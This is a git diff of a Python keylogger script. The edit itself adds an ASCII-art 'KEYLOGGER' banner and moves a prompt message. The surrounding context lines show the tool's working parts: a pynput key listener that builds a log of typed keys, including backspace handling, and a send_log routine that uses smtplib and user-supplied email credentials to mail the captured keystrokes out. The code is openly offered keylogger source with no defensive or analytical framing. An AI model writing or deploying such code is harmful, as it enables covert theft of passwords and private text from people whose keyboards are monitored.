@@ -4,11 +4,24 @@ import smtplib
 
 from pynput.keyboard import Key, Listener
 
+
 print(
-    "KEYLOGGER"
-    "Press escape to exit the program."
+
+""" _        _______           _        _______  _______  _______  _______  _______ 
+| \    /\(  ____ \|\     /|( \      (  ___  )(  ____ \(  ____ \(  ____ \(  ____ )
+|  \  / /| (    \/( \   / )| (      | (   ) || (    \/| (    \/| (    \/| (    )|
+|  (_/ / | (__     \ (_) / | |      | |   | || |      | |      | (__    | (____)|
+|   _ (  |  __)     \   /  | |      | |   | || | ____ | | ____ |  __)   |     __)
+|  ( \ \ | (         ) (   | |      | |   | || | \_  )| | \_  )| (      | (\ (   
+|  /  \ \| (____/\   | |   | (____/\| (___) || (___) || (___) || (____/\| ) \ \__
+|_/    \/(_______/   \_/   (_______/(_______)(_______)(_______)(_______/|/   \__/
+                                                                                 """
+
 )
 
+print(""
+      "Press escape to exit the program."
+      )
 # set up email
 email = input('Enter email: ')
 # getpass makes passowrd invisible
@@ -41,7 +54,7 @@ def on_press(key):
             send_log()
             full_log = ' '
 
-    elif key == Key.shift_l or key == Key.shift_r or key == Key.alt_l or key == Key.alt_r or key == Key.tab or key == Key.ctrl_l or key == Key.ctrl_r:  # ignores left or right shift
+    elif key == Key.shift_l or key == Key.shift_r or key == Key.alt_l or key == Key.alt_r or key == Key.tab or key == Key.ctrl_l or key == Key.ctrl_r:
         return
     elif key == Key.backspace:
         word = word[:-1]  # removes last item in array(slice notation)
